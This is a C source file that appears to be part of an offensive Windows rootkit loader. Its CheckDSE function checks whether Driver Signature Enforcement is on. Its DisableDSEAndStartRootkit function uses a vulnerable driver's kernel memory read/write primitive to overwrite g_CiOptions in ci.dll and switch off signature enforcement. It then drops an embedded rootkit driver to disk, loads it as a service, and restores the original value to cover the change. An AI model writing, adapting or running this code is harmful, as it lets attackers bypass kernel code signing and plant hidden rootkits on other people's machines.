
#include "common.h"
#include "rkdriver.h"

#define CODEINTEGRITY_OPTION_ENABLED                        0x01
#define CODEINTEGRITY_OPTION_TESTSIGN                       0x02

BOOL CheckDSE() {

	BOOL								bSTATE	= TRUE; 
	HMODULE								hNTDLL	= NULL; // Stores handle to ntdll.dll
	NTSTATUS							STATUS	= NULL; // Stores the NTSTATUS
	ULONG								uReturn = NULL; // Size returned in bytes from NtQuerySystemInformation
	SYSTEM_CODEINTEGRITY_INFORMATION	sci = { 0 }; // Stores the information from NtQuerySystemInformation
	sci.Length = sizeof(sci);

	// Get handle to ntdll.dll
	// https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya
	hNTDLL = LoadLibraryA("ntdll.dll");
	if (!hNTDLL) {
		errorWin32("LoadLibraryA - Failed to get handle to ntdll.dll");
		bSTATE = FALSE;
		goto _cleanUp;
	}
	info_t("LoadLibraryA - Received handle to ntdll.dll 0x%p", hNTDLL);

	// Resolve address of NtQuerySystemInformation
	fnNtQuerySystemInformation NtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(hNTDLL, "NtQuerySystemInformation");
	if (!NtQuerySystemInformation) {
		errorWin32("GetProcAddress - Failed to address of NtQuerySystemInformation");
		bSTATE = FALSE;
		goto _cleanUp;
	}
	info_t("GetProcAddress - Received address to NtQuerySystemInformation 0x%p", NtQuerySystemInformation);

	// Get the SystemCodeIntegrityInformation information
	// https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation
	STATUS = NtQuerySystemInformation(
		SystemCodeIntegrityInformation, // Returns a SYSTEM_CODEINTEGRITY_INFORMATION structure that can be used to determine the options being enforced by Code Integrity on the system.
		&sci,							// Pointer to SYSTEM_CODEINTEGRITY_INFORMATION struct
		sizeof(sci),					// Size of the SYSTEM_CODEINTEGRITY_INFORMATION struct
		&uReturn						// Returned size, no need to save it
	);
	if (!NT_SUCCESS(STATUS)) {
		errorNT("NtQuerySystemInformation failed", STATUS);
		bSTATE = FALSE;
		goto _cleanUp;
	}
	info_t("NtQuerySystemInformation - Received %lu bytes of SYSTEM_CODEINTEGRITY_INFORMATION", uReturn);
	info_t("NtQuerySystemInformation - SCI CodeIntegrityOptions: 0x%X", sci.CodeIntegrityOptions);

	// Check if DSE is enabled and test-signing is NOT enabled
	// Bitwise AND = sci.CodeIntegrityOptions & (CODEINTEGRITY_OPTION_ENABLED | CODEINTEGRITY_OPTION_TESTSIGN))
	// Comparing the resulting masked value to just CODEINTEGRITY_OPTION_ENABLED
	if ((sci.CodeIntegrityOptions & (CODEINTEGRITY_OPTION_ENABLED | CODEINTEGRITY_OPTION_TESTSIGN)) == CODEINTEGRITY_OPTION_ENABLED) {
		bSTATE = TRUE;
	}
	else {
		bSTATE = FALSE;
	}

_cleanUp:

	// Cleanup close handle
	if (hNTDLL) {
		FreeLibrary(hNTDLL);
	}

	return bSTATE;
}


BOOL DisableDSEAndStartRootkit() {

	BOOL		bSTATE				= TRUE;
	DWORD64		dwCiBaseAddress		= NULL; // Stores base address of ci.dll
	DWORD64		dwCiOptionsAddress	= NULL; // Stores base address of g_CiOptions
	HANDLE		hDevice				= NULL; // Saves handle to the device driver
	DWORD		dwCiOptionValue		= NULL; // Stores the g_CiOption value
	LPWSTR		szRKDriverPath		= NULL; // Full path to the rootkit driver

	// Get base address of ci.dll
	dwCiBaseAddress = FindCIBaseAddress();
	if (!dwCiBaseAddress) {
		error("FindCIBaseAddres - Failed to get base address of \"ci.dll\"");
		bSTATE = FALSE;
		goto _cleanUp;
	}
	info_t("disableDSE - CI address: 0x%p", dwCiBaseAddress)

	// Get the base address of g_CiOptions
	dwCiOptionsAddress = dwCiBaseAddress + g_ciOffsets.st.g_CiOptions;
	info_t("disableDSE - g_CiOptions address: 0x%p", dwCiOptionsAddress);

	// Open a handle to the vulnerable driver using symbolik link
	hDevice = GetDeviceHandle(g_VULNDRIVERSYMLINK);
	if (hDevice == NULL) {
		error("GetDeviceHandle - Failed");
		bSTATE = FALSE;
		goto _cleanUp;
	}
	info_t("GetDeviceHandle - Handle to vulnerable driver 0x%p", hDevice);

	// Read 1 byte of g_CiOptions
	dwCiOptionValue = ReadMemoryBYTE(hDevice, dwCiOptionsAddress);
	info_t("ReadMemoryBYTE - g_CiOptions value: 0x%02X", dwCiOptionValue & 0xFF);
	
	// Disable DSE by enabling testsigning mode (0xe)
	if (!WriteMemoryPrimitive(hDevice, 1, dwCiOptionsAddress, 0xe)) {
		error("WriteMemoryPrimitive - Failed to disable DSE");
		bSTATE = FALSE;
		goto _cleanUp;
	}
	info_t("WriteMemoryPrimitive - written 0xe to g_CiOptions");
	
	// Reread new 1 byte of g_CiOptions
	dwCiOptionValue = ReadMemoryBYTE(hDevice, dwCiOptionsAddress);
	info_t("ReadMemoryBYTE - g_CiOptions value: 0x%02X", dwCiOptionValue & 0xFF);

	if (dwCiOptionValue != 0xe) {
		error("WriteMemoryPrimitive - Failed to disable DSE, value: 0x%02X", dwCiOptionValue);
		bSTATE = FALSE;
		goto _cleanUp;
	}
	info_t("WriteMemoryPrimitive - Disabled DSE successfull, value: 0x%02X", dwCiOptionValue);

	// Write the rootkit driver to the file system
	info("WriteDriverToFile - Writing rootkit driver to filesystem");
	if (!WriteDriverToFile(g_RKDRIVERFILENAME, cRKDriver, cRKDriverLength, &szRKDriverPath)) {
		error("WriteDriverToFile - Failed to write driver to filesystem");
		if (szRKDriverPath) {
			free(szRKDriverPath); // Free the allocated memory
		}
		bSTATE = FALSE;
		goto _cleanUp;
	}
	okayW(L"WriteDriverToFile - Written rootkit driver to \"%s\"", szRKDriverPath);

	// Loading rootkit driver
	infoW(L"LoadDriver - Loading rootkit driver from \"%s\" with name \"%s\"", szRKDriverPath, g_RKDRIVERNAME);
	if (!LoadDriver(g_RKDRIVERNAME, szRKDriverPath)) {
		error("LoadDriver - Failed to load rootkit driver");
		bSTATE = FALSE;
		goto _cleanUp;
	}
	okayW("LoadDriver - Loaded rootkit driver, servicename: \"%s\"", g_RKDRIVERNAME);
	
_cleanUp:

	// Check if DSE Mode is set to testsigning mode and then set it back to enabled
	dwCiOptionValue = ReadMemoryBYTE(hDevice, dwCiOptionsAddress);
	if (dwCiOptionValue == 0xe) {
		info_t("WriteMemoryPrimitive - g_CiOptions value: 0x%02X, Changing it back to 0x6", dwCiOptionValue & 0xFF);
		// Enable DSE again (0x6 = DSE Enabled mode)
		WriteMemoryPrimitive(hDevice, 1, dwCiOptionsAddress, 0x6);

		// Reread 1 byte of g_CiOptions
		dwCiOptionValue = ReadMemoryBYTE(hDevice, dwCiOptionsAddress);
		info_t("ReadMemoryBYTE - g_CiOptions value: 0x%02X", dwCiOptionValue & 0xFF);

		if (dwCiOptionValue != 0x6) {
			error("WriteMemoryPrimitive - Failed to enable DSE again");
		}
		info_t("WriteMemoryPrimitive - Enabled DSE - g_CiOptions value: 0x%02X", dwCiOptionValue & 0xFF);
	}

	// Close handle to device
	if (hDevice) {
		CloseHandle(hDevice);
	}

	return bSTATE;

}